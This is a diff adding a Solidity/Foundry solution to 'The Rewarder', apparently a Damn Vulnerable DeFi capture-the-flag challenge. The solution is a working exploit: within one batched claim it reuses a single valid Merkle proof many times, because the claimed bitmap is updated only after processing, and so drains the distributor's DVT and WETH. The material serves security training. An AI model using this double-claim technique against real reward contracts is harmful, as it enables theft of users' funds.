@@ -147,7 +147,46 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {}
+    function test_theRewarder() public checkSolvedByPlayer {
+        uint256 PLAYER_WETH_CLAIM = 1171088749244340;
+        uint256 PLAYER_DVT_CLAIM = 11524763827831882;
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 totalLoopDVT = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM;
+        uint256 totalLoopWETH = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM;
+
+        // * Creating an array of claims for both DVT and WETH
+        // * For each claim we use the same valid merkle proof but is treated as unique in the same transaction.
+        // * bitmap is happen after all claims are processed, we can drain everything in a single txns
+        Claim[] memory claims = new Claim[](totalLoopDVT + totalLoopWETH);
+        for (uint256 i = 0; i < (totalLoopDVT + totalLoopWETH); i++) {
+            if (i >= totalLoopDVT) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_WETH_CLAIM,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188)
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_DVT_CLAIM,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)
+                });
+            }
+        }
+
+        distributor.claimRewards(claims, tokensToClaim);
+        // * After claiming, we transfer all the tokens from the player to the recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
